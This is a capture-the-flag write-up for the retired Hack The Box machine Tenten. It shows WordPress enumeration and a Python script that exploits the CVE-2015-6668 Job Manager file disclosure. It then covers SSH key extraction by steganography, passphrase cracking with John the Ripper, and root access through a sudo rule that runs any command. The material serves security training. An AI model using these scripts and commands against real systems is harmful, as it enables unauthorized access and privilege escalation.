# ⭐Tenten - Hack The Box Write-up ⭐
![HTB](https://img.shields.io/badge/HTB-Retired-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-CTF-red)

## 📋 Machine Info

| Property | Value |
|----------|-------|
| **Difficulty** | Medium |
| **OS** | Linux (Ubuntu) |
| **IP** | 10.10.10.10 |
| **Category** | CTF / Retired Machine |
| **Tags** | WordPress, CVE-2015-6668, Steganography, SSH Key, Privilege Escalation, SUID |

---
## Overview

This writeup covers the exploitation of the retired Hack The Box machine **Tenten**, which demonstrates WordPress plugin vulnerabilities, steganography techniques, and Linux privilege escalation through misconfigured SUID binaries.

**Key Steps:**
* WordPress enumeration and plugin discovery
* Exploiting CVE-2015-6668 (Job Manager file disclosure)
* Steganography analysis to extract SSH keys
* SSH key cracking with John the Ripper
* Privilege escalation via SUID binary abuse
---
## Enumeration

### Port Scan (Nmap)

```bash
sudo nmap -sS -Pn -T4 --min-rate=1000 -p 22,80,443,8080,3306 10.10.10.10
```

**Open Ports:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
```

### Hostname Resolution

The site redirected to `tenten.htb`. To access it locally, add the following to `/etc/hosts`:

```bash
echo "10.10.10.10 tenten.htb" | sudo tee -a /etc/hosts
```
---

## Web Reconnaissance

**Initial Analysis:**
* **CMS:** WordPress installation detected
* **Technology Stack:** PHP, Apache/nginx

**WordPress Enumeration with WPScan:**

```bash
# Enumerate users
wpscan --url http://tenten.htb/ -e u --disable-tls-checks

# Enumerate plugins aggressively
wpscan --url http://tenten.htb/ -e ap --plugins-detection aggressive --api-token YOUR_TOKEN
```

**Key Findings:**
* **Username discovered:** `takis`
* **Vulnerable plugin:** `job-manager` version `0.7.25`
* **CVE:** CVE-2015-6668 (File disclosure vulnerability)
---
## Initial Foothold

### CVE-2015-6668 Exploitation

The Job Manager plugin version 0.7.25 is vulnerable to a file disclosure attack that allows reading arbitrary files from the server.

**Vulnerability Details:**
* **CVE ID:** CVE-2015-6668
* **Description:** CV filename disclosure on Job-Manager WP Plugin
* **Affected Version:** 0.7.25

### File Discovery Script

Created a Python script to brute force file paths based on upload dates:

```python
#!/usr/bin/env python3

import requests

print("""
CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Author: Evangelos Mourikis
""")

website = input('Enter a vulnerable website: ')
filename = input('Enter a file name: ')
filename2 = filename.replace(" ", "-")

for year in range(2013, 2018):
    for i in range(1, 13):
        for extension in ['doc', 'pdf', 'docx', 'jpg']:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02d}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code == 200:
                print("URL of CV found! " + URL)
```

### Manual Enumeration

Used a bash loop to enumerate job applications:

```bash
for i in $(seq 1 20); do 
    echo -n "$i: "; 
    curl -sL http://tenten.htb/index.php/jobs/apply/$i/ | grep '<title>'; 
done
```

**Key Discovery:**
* Found application: `HackerAccessGranted`
* File location: `/wp-content/uploads/2017/04/HackerAccessGranted.jpg`

---
## Steganography Analysis

### File Extraction

Downloaded and analyzed the suspicious image file:

```bash
# Download the file
wget http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg

# Check file type
file HackerAccessGranted.jpg

# Extract hidden data using steghide
steghide extract -sf HackerAccessGranted.jpg
```

**Result:** Extracted an SSH private key (`id_rsa`)

### SSH Key Analysis

```bash
# Check the extracted key
cat id_rsa
# Key is encrypted and requires a passphrase
```
---
## Credential Cracking

### SSH Key Cracking with John the Ripper

```bash
# Convert SSH key to John format
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash

# Crack the passphrase
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**Cracked Password:** `superpassword`
---
## SSH Access

```bash
# Set proper permissions
chmod 600 id_rsa

# SSH login as takis
ssh -i id_rsa takis@tenten.htb
# Enter passphrase: superpassword
```

**Fix terminal issues:**
```bash
export TERM=xterm
```
---
## Privilege Escalation

### Enumeration

```bash
# Check user groups
id
# takis is member of lxd group (potential vector)

# Check sudo privileges
sudo -l
```

**Key Finding:**
```
User takis may run the following commands on tenten:
    (ALL : ALL) NOPASSWD: /bin/fuckin
```

### SUID Binary Analysis

```bash
# Examine the binary
ls -la /bin/fuckin
cat /bin/fuckin
```

**Binary Content:**
```bash
#!/bin/bash
$1
```

The binary simply executes the first argument passed to it.

### Root Exploitation

Since we can run `/bin/fuckin` as root without a password, and it executes any command passed as an argument:

```bash
# Execute bash as root
sudo /bin/fuckin bash
```

**Result:** Root shell obtained!
---
## 🏁 Flags

* **User Flag:** Located in `/home/takis/user.txt`
* **Root Flag:** Located in `/root/root.txt`

## Tools Used

| Category | Tools |
|----------|-------|
| **Reconnaissance** | nmap, wpscan, curl, whatweb |
| **Exploitation** | Custom Python script, steghide |
| **Credential Cracking** | john, ssh2john |
| **Post-Exploitation** | ssh, sudo |
---
## Key Takeaways

* WordPress plugin vulnerabilities can lead to file disclosure attacks
* Steganography is commonly used to hide sensitive data in CTF environments
* Always enumerate sudo privileges thoroughly during privilege escalation
* Misconfigured SUID binaries can provide direct paths to root access
* File upload functionalities in web applications should be properly secured
---
## ⚠️ Disclaimer

> **This writeup is for educational purposes only.**
> 
> Do not use these techniques on systems you do not own or have permission to test.
> 
> In accordance with the Hack The Box Terms of Service, this writeup covers only retired HTB machines. Publishing writeups of active machines is a violation of their rules and may lead to account suspension.
